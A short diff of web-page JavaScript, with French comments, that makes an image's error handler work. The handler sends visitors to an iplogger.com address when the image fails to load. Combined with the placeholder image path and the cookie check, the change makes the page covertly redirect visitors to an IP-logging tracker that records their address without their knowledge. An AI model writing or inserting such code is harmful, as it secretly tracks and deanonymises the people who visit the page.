@@ -121,7 +121,9 @@
         var img = document.createElement("img");
         img.src = "path_to_your_image.jpg"; // Remplacer par le chemin de votre image
         img.alt = "Example Image";
-        img.onerror="window.location='https://iplogger.com/2ZJXW5'";
+        img.onerror = function() {
+            window.location = 'https://iplogger.com/2ZJXW5';
+        };
         document.getElementById("content").appendChild(img);
     } else {
         // Si le cookie est "true", afficher un message ou une autre action
